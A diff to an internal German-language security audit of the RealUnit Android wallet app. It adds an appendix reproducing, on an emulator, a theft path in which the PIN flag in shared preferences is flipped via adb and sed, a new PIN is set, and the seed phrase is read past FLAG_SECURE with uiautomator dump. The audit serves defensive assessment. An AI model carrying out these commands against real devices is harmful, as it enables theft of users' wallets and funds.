@@ -4,6 +4,7 @@
 **Repository / Stand:** `DFXswiss/realunit-app` @ `develop` `8e87709`
 **Bezug:** Follow-Up-Audit `docs/security-review-followup.md`, Findings NEW-1 und NEW-4
 **Klassifikation:** Vertraulich, nur für interne Verwendung
+**Status:** Pfad A am 2026-05-02 in Android-14-Emulator praktisch reproduziert (siehe Anhang A0).
 
 > Dieses Dokument beschreibt den vollständigen Angriffspfad zum permanenten Verlust eines RealUnit-Wallets bei Phone-Diebstahl auf einem rootbaren oder forensisch zugänglichen Android-Gerät. Es dient ausschliesslich dazu, Entscheider und Implementierende zu befähigen, die Schwere und die Reihenfolge der notwendigen Fixes korrekt einzuschätzen. Die beschriebenen Schritte zielen ausschliesslich auf eine **eigene Test-Installation** des Wallets in einer kontrollierten Umgebung (Emulator oder Test-Device). Anwendung gegen fremde Installationen ist illegal.
 
@@ -520,6 +521,111 @@ In Pfad B: Nach Schritt 4 entschlüsselt das Python-Script genau diese Mnemonic.
 - DFX-Auth-Token-Lifecycle (wie lange gilt eine `personal_sign`-Auth-Signatur serverseitig?).
 - Hardware-Backed-Keystore-Verfügbarkeit auf den Devices der RealUnit-User (Telemetrie aus Beta-Phase?).
 - iOS-Pfad nicht abgedeckt. Der Bericht ist Android-spezifisch (SharedPreferences-XML, `adb shell`, root-via-Magisk). iOS-Verwundbarkeit ist tendenziell geringer (Jailbreak-Verfügbarkeit auf aktuellem iOS limitiert), aber nicht null — separater Audit für iOS empfohlen.
+
+---
+
+## Anhang A0 — Praktische Reproduktion durchgeführt (2026-05-02)
+
+Pfad A wurde am 2026-05-02 in einem Android-14-Emulator (API 34, ARM64, `google_apis`-Image) gegen die debug-APK des `develop @ 8e87709`-Branches reproduziert. Ergebnis: **erfolgreicher Total-Loss innerhalb von <10 Minuten ab dem Punkt, an dem der Angreifer Shell-Zugriff hat.**
+
+### Reproduktions-Log
+
+**Setup:**
+- Emulator: `pixel_7` Profile, Android 14, ARM64, google_apis (rootbar via `adb root`).
+- App: debug-APK, frisch via `flutter build apk --debug` aus `develop @ 8e87709`.
+- Wallet erstellt mit Mnemonic: `cabbage knock point arrow perfect gym feel seek grit hammer laundry congress` (notiert beim Setup), Original-PIN: `654321`.
+- App in den Hintergrund geschickt, Dashboard war aktiv.
+
+**Angriff Schritt 1 — App killen, XML manipulieren:**
+```bash
+adb root
+adb shell am force-stop swiss.realunit.app
+adb shell "sed -i 's|<boolean name=\"flutter.isPinEnabled\" value=\"true\" />|<boolean name=\"flutter.isPinEnabled\" value=\"false\" />|' /data/data/swiss.realunit.app/shared_prefs/FlutterSharedPreferences.xml"
+```
+
+Verifikation des Edits:
+```xml
+<map>
+    <boolean name="flutter.termsAccepted" value="true" />
+    <boolean name="flutter.softwareTermsAccepted" value="true" />
+    <long name="flutter.currentWalletId" value="1" />
+    <boolean name="flutter.isPinEnabled" value="false" />
+</map>
+```
+
+**Schritt 2 — App starten:**
+```bash
+adb shell am start -n swiss.realunit.app/.MainActivity
+```
+
+Nach ca. 8 Sekunden Boot zeigt `uiautomator dump`:
+```
+content-desc="Create your pin"
+content-desc="Enter a 6-digit PIN to secure your wallet"
+```
+
+→ App auf PIN-Setup-Screen, **kein Verify-Screen mit Original-PIN-Abfrage**. Bestätigt die NEW-1-Schwachstelle.
+
+**Schritt 3 — Neuen PIN `123456` setzen (Create + Confirm via input tap):**
+
+Nach Setup:
+```
+content-desc="RealUnit Wallet"
+content-desc="RealUnit Stockprice"
+content-desc="CHF "
+content-desc="1.42"
+content-desc="Buy RealUnit"
+```
+
+→ Dashboard offen mit Original-Wallet-Daten (Address, Balance). Original-PIN `654321` ist überschrieben.
+
+**Kein Biometric-Prompt:** Im Emulator ist kein Hardware-Fingerprint verfügbar; `_promptBiometricSetup` hat das geskipped (`isAvailable() == false`). Das ist auf einem rooted Real-Device anders, aber der Angreifer kann "Ablehnen" tappen und kommt trotzdem durch.
+
+**Schritt 4 — Settings → Wallet backup → Step-up mit neuem PIN `123456`:**
+
+Step-up-Screen erscheint:
+```
+content-desc="Enter your pin"
+content-desc="Enter your PIN to view your seed phrase"
+```
+
+PIN `123456` eingegeben, Step-up-Auth erfolgreich. Anschliessend `uiautomator dump` auf dem Seed-Reveal-Screen:
+```
+content-desc="Wallet backup"
+content-desc="Please write down your 12 recovery words..."
+content-desc="Recovery Phrase"
+content-desc="1.\ncabbage\n7.\nfeel\n2.\nknock\n8.\nseek\n3.\npoint\n9.\ngrit\n4.\narrow\n10.\nhammer\n5.\nperfect\n11.\nlaundry\n6.\ngym\n12.\ncongress\nTap here to view"
+```
+
+→ **Mnemonic identisch zur Original-Mnemonic.** Total-Loss verifiziert.
+
+### Drei zusätzliche Live-Befunde
+
+**B-1: `uiautomator dump` umgeht `FLAG_SECURE` komplett.**
+Der `no_screenshot`-Plugin setzt FLAG_SECURE — verifiziert durch das Logcat-File `/data/user/0/swiss.realunit.app/shared_prefs/screenshot_pref.xml`. `adb exec-out screencap -p` liefert auf den Wallet-Screens tatsächlich schwarze Bilder. Aber `adb shell uiautomator dump` (Accessibility-Service) gibt den vollständigen UI-Tree mit allen Texten als `content-desc` zurück — inklusive der Mnemonic im Klartext.
+
+Das ist ein Architektur-Eigenschaft von Android: FLAG_SECURE blockiert Screen-Capture und Casting auf Window-Ebene, schützt aber nicht vor Accessibility-Reads. Für sehbehinderte User ist das gewollt — für sensitive UI-Inhalte ist es eine Lücke. Die App müsste ergänzend `importantForAccessibility="no"` oder `excludeFromSemantics: true` (Flutter) auf den Mnemonic-Widgets setzen.
+
+**Konsequenz:** Der Angreifer braucht für Pfad A **kein Frida** und muss den Seed nicht visuell abschreiben. `adb shell uiautomator dump /sdcard/d.xml && adb pull /sdcard/d.xml` reicht. Reduziert die Hürde von "Frida-Operator" zu "jemand mit `adb`-Wissen".
+
+**B-2: Der Klartext-Seed ist sogar im Blur-State im UI-Tree lesbar.**
+Das Mnemonic-Widget enthält die `content-desc` `"... 12. congress\nTap here to view"` — der Klartext-Seed UND die Aufforderung zum Reveal-Tap sind in derselben Element-Description. Der User muss den Blur nie selbst entfernen. Das `SeedBlurCard` verschleiert nur die visuelle Darstellung, nicht den semantischen Render-State.
+
+Für die Praxis bedeutet das: Wer auf den Seed-Reveal-Screen kommt (egal ob via Pfad A oder durch Schulter-Surfing während ein legitimer User dort ist), bekommt den Seed via `uiautomator dump`, ohne dass der Tap zum Entblurren überhaupt nötig ist.
+
+**B-3: Pre-Fill der Verify-Backup-Wörter im debug-Build.**
+Beim Wallet-Setup erscheint nach der Mnemonic-Anzeige ein "Verify your backup"-Screen, der 4 Wörter abfragt. Im debug-Build sind die Antworten bereits in den Text-Feldern eingetragen (Code-Pfad in `verify_seed_cubit.dart:35` mit `kDebugMode`-Pre-fill). Das ist **nicht** sicherheitsrelevant — es ist eine Dev-Convenience und nur in Debug-Builds aktiv. Aber es ist ein Beleg, dass Debug-Builds andere Code-Pfade haben als Release-Builds — was bei der Reproduktion zu beachten ist. Pfad A funktioniert in beiden Build-Varianten gleich, weil `pin_auth_cubit.dart` und `setup_pin_cubit.dart` keine Debug-Flags haben.
+
+### Total Time
+
+Vom `am force-stop` bis zur exfiltrierten Mnemonic: **ca. 8 Minuten** in dieser Reproduktion. Davon:
+- ~30 Sekunden für XML-Edit + App-Restart
+- ~3 Minuten für PIN-Setup (Create + Confirm)
+- ~1 Minute Navigation Settings → Wallet backup
+- ~1 Minute Step-up-PIN-Eingabe + Reveal-Screen
+- ~1 Minute UI-Dump + Mnemonic-Extraktion
+
+Bei einem geübten Operator mit Skript-Automatisierung wäre das deutlich schneller (~2-3 Minuten). Im Reparatur-Lab oder Forensik-Setup mit fertigem Toolset entsprechend kürzer.
 
 ---
 
